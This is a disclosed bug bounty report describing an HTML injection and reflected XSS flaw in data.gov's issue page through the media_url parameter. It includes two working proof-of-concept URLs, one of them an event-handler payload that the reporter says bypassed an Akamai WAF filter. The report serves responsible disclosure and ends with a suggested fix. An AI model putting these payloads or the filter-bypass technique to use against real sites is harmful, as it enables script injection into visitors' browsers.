# HTML injection (with XSS possible) on the https://www.data.gov/issue/ using media_url attribute

## Report Details
- **Report ID**: 263226
- **URL**: https://hackerone.com/reports/263226
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-08-25T13:33:29.074Z
- **Disclosed**: 2017-09-15T13:38:30.757Z

## Reporter
- **Username**: sp1d3rs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
##Description
Hello. I discovered Cross-Site scripting issue on the https://www.data.gov/issue/ endpoint.

##Akamai WAF and bypass
At the srart i was not able to do the XSS due to Akamai Waf XSS filters, but later, i was able to bypass it.

##POC (HTML injection)
https://www.data.gov/issue/?media_url=catalog.data.gov/dataset/consumer-complaint-database%22%3E%3Csvg%20height=%22100%22%20width=%22100%22%3E%20%3Ccircle%20cx=%2250%22%20cy=%2250%22%20r=%2240%22%20stroke=%22black%22%20stroke-width=%223%22%20fill=%22red%22%20/%3E%20%3C/svg%3E
{F215755}

##POC (Reflected XSS)
Use this link in the Mozilla Firefox
https://www.data.gov/issue/?media_url=catalog.data.gov/dataset/consumer-complaint-database%22%3E%3C/div%3E%3C/div%3E%3Cbrute%20onbeforescriptexecute=%27confirm(document.domain)%27%3E
{F215768}

##Suggested fix
Sanitize all input fields on this page. 

## Attachments
- c.PNG
- cx.PNG
